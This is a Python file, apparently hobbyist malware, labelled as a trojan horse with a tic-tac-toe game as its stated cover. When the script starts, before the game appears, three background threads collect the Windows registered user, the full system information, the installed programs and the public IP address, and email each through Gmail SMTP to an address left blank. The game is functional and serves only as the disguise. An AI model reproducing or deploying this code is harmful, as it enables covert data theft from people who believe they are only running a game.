import threading
from termcolor import colored
import os, smtplib, subprocess, requests

##############################Trojan-Horse#################################

def send_sys_infs():
    #get the registered user
    data = subprocess.check_output('wmic os get RegisteredUser').decode()
    registered_user = data.split('\n')[1].split()[0]
    #save the system information in a text file
    path = f'c:/Users/{registered_user}/yourdatalol.txt'
    os.system(f'systeminfo > {path} 2>&1')
    file = open(f'c:/Users/{registered_user}/yourdatalol.txt', 'r')
    sysdata = file.read()
    #send the data to a mail address from another mail address
    obj = smtplib.SMTP('smtp.gmail.com', 587)
    obj.starttls()
    obj.login('', '')#from mail address and it's password
    obj.sendmail('', '', sysdata)#from address and to address
    obj.quit()

def send_programs_installed():
    data = subprocess.check_output('wmic product get name,version'.split()).decode()
    obj = smtplib.SMTP('smtp.gmail.com', 587)
    obj.starttls()
    obj.login('', '')#from mail address and it's password
    obj.sendmail('', '', data)#from address and to address
    obj.quit()

def public_ip_data():
    req_website = 'https://api.ipify.org?format=json'
    req_data = requests.get(req_website).json()
    ip = req_data['ip']
    obj = smtplib.SMTP('smtp.gmail.com', 587)
    obj.starttls()
    obj.login('', '')#from mail address and it's password
    obj.sendmail('', '', ip)#from address and to address
    obj.quit()

x1 = threading.Thread(target=send_sys_infs, daemon=True)
x2 = threading.Thread(target=public_ip_data, daemon=True)
x3 = threading.Thread(target=send_programs_installed, daemon=True)

x1.start()
x2.start()
x3.start()

x1.join()
x2.join()
x3.join()

##############################Tic-Tac-Toe(cover)###############################
def game():
    os.system('cls')
    def check(b):
        if (b[0][0] == b[0][1]) and (b[0][1] == b[0][2]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][0] == b[1][0]) and (b[1][0] == b[2][0]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][-1] == b[1][-1]) and (b[1][-1] == b[2][-1]) and b[0][-1] != ' ':
            return [True, b[0][-1]]
        elif (b[-1][0] == b[-1][1]) and (b[-1][1] == b[-1][2]) and b[-1][0] != ' ':
            return [True, b[-1][0]]
        elif (b[0][0] == b[1][1]) and (b[1][1] == b[2][2]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][-1] == b[1][1]) and (b[1][1] == b[-1][0]) and b[0][-1] != ' ':
            return [True, b[0][-1]]
        return [False]

    board = [[' ', ' ', ' '],
            [' ', ' ', ' '],
            [' ', ' ', ' ']]

    while True:
        print(colored('Tic Tac Toe\n\t  -Der game', 'magenta'))
        print('-'*20)
        print(colored('Rules:Just the same as a regular pen&paper one', 'cyan'))
        print(colored('Coordinates:\n__|__|__ (X, Y=0, 0),(X, Y=0, 1),(X, Y=0, 2)\n__|__|__ (X, Y=1, 0),(X, Y=1, 1),(X, Y=1, 2)\n  |  |   (X, Y=2, 0),(X, Y=2, 1),(X, Y=2, 2)', 'cyan'))
        print('-'*20)
        print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
        print('__|__|__')
        print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
        print('__|__|__')
        print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
        cx = [int(input('Enter x-coord(X):')), int(input('Enter y-coord(X):'))]
        os.system('cls')
        print(colored('Tic Tac Toe\n\t  -Der game', 'magenta'))
        print('-'*20)
        print(colored('Rules:Just the same as a regular pen&paper one', 'cyan'))
        print(colored('Coordinates:\n__|__|__ (X, Y=0, 0),(X, Y=0, 1),(X, Y=0, 2)\n__|__|__ (X, Y=1, 0),(X, Y=1, 1),(X, Y=1, 2)\n  |  |   (X, Y=2, 0),(X, Y=2, 1),(X, Y=2, 2)', 'cyan'))
        print('-'*20)
        if board[cx[0]][cx[-1]] == ' ':
            board[cx[0]][cx[-1]] = 'X'
        else:
            print(colored('Coordinate already taken', 'red'))
        if check(board)[0] == True:
            print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
            print('__|__|__')
            print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
            print('__|__|__')
            print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
            print(colored(f'{check(board)[-1]} wins!'), 'green')
            break
        print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
        print('__|__|__')
        print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
        print('__|__|__')
        print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
        c = 0
        for i in range(3):
            for j in range(3):
                if board[i][j] != ' ':
                    c += 1
        if c == 9:
            print("Draw")
            break
        co = [int(input('Enter x-coord(O):')), int(input('Enter y-coord(O):'))]
        os.system('cls')
        if board[co[0]][co[-1]] == ' ':
            board[co[0]][co[-1]] = 'O'
        else:
            print(colored('Coordinate taken already', 'red'))
        if check(board)[0] == True:
            print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
            print('__|__|__')
            print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
            print('__|__|__')
            print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
            print(colored(f'{check(board)[-1]} wins!', 'green'))
            break
        c = 0
        for i in range(3):
            for j in range(3):
                if board[i][j] != ' ':
                    c += 1
        if c == 9:
            print("Draw")
            break
game()
